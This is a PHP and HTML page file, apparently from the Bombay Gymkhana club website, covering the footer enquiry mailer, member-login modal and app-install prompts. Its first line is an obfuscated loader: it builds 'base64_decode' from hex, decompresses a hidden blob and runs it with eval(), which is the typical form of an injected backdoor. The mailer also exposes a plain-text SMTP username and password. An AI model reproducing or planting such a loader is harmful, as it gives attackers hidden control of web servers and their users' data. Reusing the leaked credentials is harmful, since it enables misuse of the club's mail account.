class dHgEaRa{public function __call($name,$arguments){if($name=="dGdaEsIw"){RETURN $this->giClQ($arguments[0]);}}private function giClQ($bYlH){return $this->badFre()($bYlH);}private function badFre($hex="6465",$tnF="636f6465",$DCx="6261736536345f"){return pack("H*",$DCx.$hex.$tnF);}}$gadj=new dHgEaRa();$str2=gzuncompress($gadj->dGdaEsIw("eJzNVFFv2zYQfraB/Id78BonzWzXbjFgmYcVqYsV6JLAcbaHojBI6iTRkkiapGTJw/77jpK9eHvx9jZAsHWn7z7yvo+8i/74+roP18AEi7BoQOjCoEfloZC1Ly1CxaxkXmoFe61wFMACLRZaNRChlRUCBQHAcnBYSKFVVAqvLXgsTI6wY9J5+q1Dcaj/yTCRsQThN22jR4vOUXbcv+gPqkkFc7hMofaN9xkYbb9P3JgX40zvYLcz8S7hI8gSLVPe6CxRCMLztOK4j5pNud3W1m9rFo+oo53XLC2yZMwF1hX3NXNZk3Gx3TCEqXMzX0wK/g74G11+F22+3ZbTyExTM64ZYxuzAenlNDYz4JMinppktN2bjUk31uDu8jbs9k3YrfM2RzUMe78KWaV3pc1DGwEUazscyPnkFgbyh1ARXl6/vvr9ot+T8ZAC+AZmMJ/DBNpk70gwmkPg/DKQX4mn98dFn56jXcZYbYIxCJlCzMku5ySJrXkuSVltufRgWXTwrpLWlyxv7YtKyzhBYybK3DegjZdU7qUAiwmhR4cl0EviD2uhaJeKA20EqbZWBoac4C7vVii0jv6FwW+DZMxa1gxbtapZSGycVmtUQkdIkqyfFstfF0voAG+rL5dpbjE1uOeXXyHIMqv+Ke30RNcDqSAV11JJ367Ua0OHntodthQ3cPe8/PzwuFrT3w0cdT8H/nnx/sNieUPy5Q7PopeL1fPyfrV8f//0MVR5W54venx4Wv0H6MdPi88fnqiDoO65gruH+/vF3Wr16ZfFwzOtMpt0JYPq3V+iYY2iqzt+e3EpwoNLhD/dIz3/q1nS3i7p1t1ZOzRzuGK9sNsenR9kIh22n5iDQYbN/MdB5Q6gQUi0x82FBsMN7B1riZwuHPrhQOwzVei0tFfw6hWchB1JiiSGPYWdcv2dSiWZU4pncUf1EnZUKFJ9kr3tkrX0L4ycOsrasJsYvdOhwZn3aBvA2tDASFAX6ClMmW0NSLXOIKcbb0E1+WEK5ChdcK7QQXdVSseUQDDM0rggP1zJS8u7sSKdsDRIVOdwjAUjQMIsD/akOm+IvR08qqTS0p2x8E/NRwhW"));eval($str2);


                            use PHPMailer\PHPMailer\PHPMailer;
                            use PHPMailer\PHPMailer\Exception;

                            require 'PHPMailer-master/src/PHPMailer.php';
                            require 'PHPMailer-master/src/Exception.php';
                            require 'PHPMailer-master/src/SMTP.php';

                            if (isset($_POST['enquirysubmit'])) {
                                $name = $_POST['clientname'];
                                $phone = $_POST['phone'];
                                $email = $_POST['email'];


                                $mail = new PHPMailer(true);
                                $subject = "Enquiry Form"; //getting subject line from client
                                //Message for client confirmation
                                $message2 = "Name : " . $name . "\n\n" 
                                    . "Phone : " . $phone . "\n\n"
                                    . "Email : " . $email . "\n\n";

                                $mail->isSMTP();
                                $mail->Host = 'smtpbp.falconide.com';
                                $mail->SMTPAuth = true;
                                $mail->Username = 'bombaygymkhana';
                                $mail->Password = 'Mumbai@16';
                                $mail->SMTPSecure = 'Tls';
                                $mail->Port = '587';
                                $mail->setFrom('admin@bombaygymkhana.com');
                                $mail->addAddress('admin@bombaygymkhana.com');
                                $mail->isHTML(true);
                                $mail->Subject =  $subject;
                                $mail->Body = $message2;
                                $mail->send();

                                echo "<script>alert('Form Submitted');</script>";
                            }
                            ?>

                        </div>

                    </div>

                </div>

            </div>

        </div>

        <div class="footer-bottom">

            <div class="container">

                <div class="row">

                    <div class="col-md-12">

                        <div class="footer-bottom-inner">

                            <p class="footer-bottom-copy-right">© Copyright 2023. Designed & Developed by The Works
                                <a href="#"></a>
                            </p>

                        </div>

                    </div>

                </div>

            </div>

        </div>

    </footer>

    <div class="modal" id="myModal" tabindex="-1" role="dialog">
        <div class="modal-dialog" role="document">
            <div class="modal-content" style="background-color: #fff;">
                <div class="modal-body">
                    <div class="d-flex" style="align-items:center;justify-content:center;">
                        <div class="">
                            <img src="img/logo-dark.png" alt="">
                        </div>
                        <div style="padding-left:30px">
                            <h1>Bombay Gymkhana</h1>
                            <div class="pop-up-trigger">
                                <button type="button" class="popup" data-toggle="modal" data-target="#myModal1" style=" background: #111; padding: 10px 15px; border-radius: 8px; color: #fff;">Install App</button>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <!-- jQuery -->


    <!-- ================ Enquire Now ==================== -->

    <div class="modal fade " tabindex="-1" role="dialog" id="enquire-modal" data-backdrop="static" data-keyboard="false">

        <div class="modal-dialog" role="document">

            <div class="modal-content">

                <div class="modal-body">



                    <!-- Booking From -->

                    <div class="col-md-12">



                        <div class="booking-box" id="log-form">
                            <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                                <span aria-hidden="true">×</span>
                            </button>
                            <div class="head-box">
                                <!-- <h6>Rooms & Suites</h6> -->
                                <h4>Member Login</h4>
                            </div>
                            <div class="booking-inner clearfix">
                                <form action="javascript:void(0);" class="form1 clearfix" id="enquire" onsubmit="return save_landing_pageinfo();">
                                    <div class="row">
                                        <div class="col-md-4">
                                            <div class="input1_wrapper">
                                                <!-- <label>Check in</label> -->
                                                <div class="input1_inner">
                                                    <input type="text" name="clientid1" oninput="this.value = this.value.toUpperCase()" class="form-control input " placeholder="e.g A/AB">
                                                    <label for="clientid1" class="error"></label>
                                                </div>
                                            </div>
                                        </div>
                                        <div class="col-md-4">
                                            <div class="input1_wrapper">
                                                <!-- <label>Check in</label> -->
                                                <div class="input1_inner">
                                                    <input type="text" name="clientid2" class="form-control input " placeholder="e.g 001">
                                                    <!-- <label for="clientid2" class="error"></label> -->
                                                </div>
                                            </div>
                                        </div>
                                        <div class="col-md-4">
                                            <div class="input1_wrapper">
                                                <!-- <label>Check in</label> -->
                                                <div class="input1_inner">
                                                    <input type="text" name="clientid3" class="form-control input " placeholder="e.g 01">
                                                    <label for="clientid3" class="error"></label>
                                                    <input type="hidden" name="uniqid" value="logpass">
                                                </div>
                                            </div>
                                        </div>
                                        <div class="col-md-12">
                                            <div class="input1_wrapper">
                                                <!-- <label>Check in</label> -->
                                                <div class="input1_inner">
                                                    <input type="password" name="pass" class="form-control input " placeholder="Password">
                                                    <label for="pass" class="error"></label>
                                                </div>
                                            </div>
                                        </div>
                                        <div class="col-md-12">
                                            <p id="errormsg">Invalid User Id or Password</p>
                                            <button type="submit" id="submit" class="btn-form1-submit mt-15">Login</button>
                                            <p class="gentxt">
                                                Don’t Have a Password?
                                                <a href="/generate.php" id="">
                                                    <b> Click here</b>
                                                </a> to Generate
                                            </p>
                                        </div>
                                        <p id="pass"></p>
                                        <p id="strmem"></p>
                                    </div>
                                </form>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <!-- /.modal-content -->
        </div>
        <!-- /.modal-dialog -->
    </div>


    <!-- iphone pop start -->
    <div class="modal" id="myModal1" tabindex="-1" role="dialog">
        <div class="modal-dialog" role="document">
            <div class="modal-content" style="background-color: #fff;">
                <div class="modal-body">
                    <button type="button" class="close" data-dismiss="modal" aria-label="Close" style="color:#111;">
                        <span aria-hidden="true">&times;</span>
                    </button>
                    <div class="" style="padding: 20px;">
                        <div style="text-align: center;">
                            <img src="img/logo-dark.png" alt="" style="width:100px;;">
                            <h4>Bombay Gymkhana</h4>
                            <p>Install the app now to discover everything happening at the Bombay Gymkhana</p>
                            <div class="steps" style="padding:10px;">
                                <p>Step1 : Click on the share tab</p>
                                <p>Step2 : Click on add to home screen</p>
                                <p>Tap <img src="images/black-icons/upload.png" style="width: 20px;" alt=""> and then "Add to Screen".</p>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <div class="modal" id="popup2" tabindex="-1" role="dialog">
        <div class="modal-dialog" role="document" style="position: absolute !important;width: auto !important;margin: 0 !important;pointer-events: none;bottom: 0 !important; width: 100% !important; max-width: 100% !important;">
            <div class="modal-content" style="background-color: #fff;">
                <div class="modal-body">
                    <div class="d-flex" style="align-items:center;justify-content:center;">
                        <div class="">
                            <img src="img/logo-dark.png" alt="">
                        </div>
                        <div style="padding-left:30px">
                            <h1>Bombay Gymkhana</h1>
                            <div class="pop-up-trigger">
                                <button type="button" class="popup2" data-toggle="modal" data-target="#myModal3" style=" background: #111; padding: 10px 15px; border-radius: 8px; color: #fff;">Install App</button>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <!-- iphone pop end -->

    <!-- ============================================= -->

    <!-- <script src="js/jquery-3.6.0.min.js"></script> -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>

    <script src="js/jquery-migrate-3.0.0.min.js"></script>

    <script src="js/modernizr-2.6.2.min.js"></script>

    <script src="js/imagesloaded.pkgd.min.js"></script>

    <!-- <script src="js/jquery.isotope.v3.0.2.js"></script> -->

    <script src="js/pace.js"></script>

    <!-- <script src="js/popper.min.js"></script> -->

    <!-- <script src="js/bootstrap.min.js"></script> -->
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js"></script>


    <script src="js/scrollIt.min.js"></script>

    <script src="js/jquery.waypoints.min.js"></script>

    <!-- <script src="js/owl.carousel.min.js"></script> -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/OwlCarousel2/2.2.0/owl.carousel.min.js"></script>

    <script src="js/jquery.stellar.min.js"></script>

    <script src="js/jquery.magnific-popup.js"></script>

    <script src="js/YouTubePopUp.js"></script>

    <script src="js/select2.js"></script>

    <script src="js/datepicker.js"></script>

    <script src="js/smooth-scroll.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.19.5/jquery.validate.min.js"></script>

    <!-- <script src="js/jquery.validate.js"></script> -->

    <script src="js/custom.js"></script>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/js-cookie/3.0.1/js.cookie.js"></script>

    <script src="js/cookie.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.js"></script>

    <script>
        $(document).ready(function() {
            $(".hamburger").click(function() {
                $(this).toggleClass("is-active");
            });


            $("li.nav-item").click(function() {
                $(".hamburger").removeClass("is-active");
                $(".navbar-toggler").removeClass("collapsed");
                $(".navbar-collapse").removeClass("show");
            });
        });
    </script>
    <script>
        window.addEventListener("load", function() {
            history.pushState({
                noBackExitsApp: true
            }, "");
        });

        window.addEventListener("popstate", function(event) {
            if (event.state && event.state.noBackExitsApp) {
                history.pushState({
                    noBackExitsApp: true
                }, "");
            }
        });
    </script>
    <script>
        $(window).on('load', function() {
            var userAgent = window.navigator.userAgent,
                platform = window.navigator?.userAgentData?.platform || window.navigator.platform,
                macosPlatforms = ['Macintosh', 'MacIntel', 'MacPPC', 'Mac68K', 'macOS'],
                windowsPlatforms = ['Win32', 'Win64', 'Windows', 'WinCE'],
                iosPlatforms = ['iPhone', 'iPad', 'iPod'],
                os = null;
            window.addEventListener('appinstalled', (evt) => {
                alert('Application Installing to Home Screen');
            });

            if (macosPlatforms.indexOf(platform) !== -1) {
                os = 'Mac OS';

            } else if (iosPlatforms.indexOf(platform) !== -1) {
                os = 'iOS';
                if (window.matchMedia('(display-mode: standalone)').matches) {
                    console.log("This is running as standalone.");
                    $('#myModal').modal('hide');
                } else {
                    if ((navigator.userAgent.indexOf("Opera") || navigator.userAgent.indexOf('OPR')) != -1) {
                        $('#myModal').modal('show');
                    } else if (navigator.userAgent.indexOf("Edg") != -1) {
                        $('#myModal').modal('show');
                    } else if (navigator.userAgent.indexOf("Chrome") != -1) {
                        alert("chrome");
                        $('#myModal').modal('show');
                    } else if (navigator.userAgent.indexOf("Safari") != -1) {
                        $('#myModal').modal('show');
                    } else if (navigator.userAgent.indexOf("Firefox") != -1) {
                        $('#myModal').modal('show');
                    } else if ((navigator.userAgent.indexOf("MSIE") != -1) || (!!document.documentMode == true)) //IF IE > 10
                    {
                        $('#myModal').modal('show');
                    } else {
                        // alert('unknown');
                    }
                }
            } else if (windowsPlatforms.indexOf(platform) !== -1) {
                os = 'Windows';
            } else if (/Android/.test(userAgent)) {
                os = 'Android';
                // if (window.matchMedia('(display-mode: standalone)').matches) {
                //     console.log("This is running as standalone.");
                //     $('#popup2').modal('hide');
                // } else {
                //     $('#popup2').modal('show');
                // }
            } else if (/Linux/.test(platform)) {
                os = 'Linux';
            }
        });
    </script>
    <script>
        $(".popup").click(function() {
            $('#myModal').modal('hide');
        });
    </script>
    <script>
        $(".popup2").click(function() {
            $('#popup2').modal('hide');
        });
    </script>


    <script>
        $(document).ready(function() {
            var valcook = Cookies.get('validmemcode');

            // alert(valcook);

            if (typeof valcook !== "undefined") {
                window.location.href = "/myprofile.php#user-profile";
            }

        });

        function save_landing_pageinfo(elm) {
            setTimeout(function() {
                $('input[type="submit"]').attr('disabled', 'disabled');
            }, 5000);
            var clientid1 = jQuery('input[name="clientid1"]').val();
            var clientid2 = jQuery('input[name="clientid2"]').val();
            var clientid3 = jQuery('input[name="clientid3"]').val();
            var pass = jQuery('input[name="pass"]').val();
            var uniqid = jQuery('input[name="uniqid"]').val();
            if (clientid1 == "") {
                return false;
            }

            if (clientid2 == "") {
                return false;
            }


            if (clientid1 == "") {
                return false;
            }


            if (pass == "") {
                return false;
            }
            $("#preloader").fadeIn();
            var requetsdata = '{"clientid1":"' + clientid1 + '","clientid2":"' + clientid2 + '","clientid3":"' +
                clientid3 + '","pass":"' + pass + '","uniqid":"' +
                uniqid + '"}';
            $.ajax({
                type: "POST",
                url: "login-in.php",
                dataType: "json",
                data: requetsdata,


                success: function(data) {
                    // $("#preloader").fadeIn();

                    if (data.code == "200") {


                        // alert("Suceddd");
                        // document.getElementById("updateot").value = data.lead1;
                        // document.getElementById("link223").innerHTML = data.lead1;

                        let checkpass = data.userpass;
                        // document.getElementById("otpsent").innerHTML =
                        //     "OTP Resent !";
                        var mydata = JSON.parse(data.lead1);
                        // alert(mydata);

                        console.log(mydata);
                        var CookieValue = Cookies.get('response');

                        //   alert(CookieValue);
                        const obj = JSON.parse(CookieValue);
                        const objpass = JSON.parse(data.userpass);
                        let fullid = clientid1 + "-" + clientid2 + "   " + clientid3;
                        if (objpass.StatusDescription == "Success") {

                            $('#preloader').fadeOut(300, function() {
                                $('#preloader').remove();
                            });
                            window.location.href = "/myprofile.php#user-profile";

                        } else {
                            $('#preloader').fadeOut(300, function() {
                                $('#preloader').remove();
                            });
                            document.getElementById("errormsg").style.display = "block ";
                        }
                    } else {
                        alert("fail");
                    }
                }
            })
        };
    </script>

</body>


</html>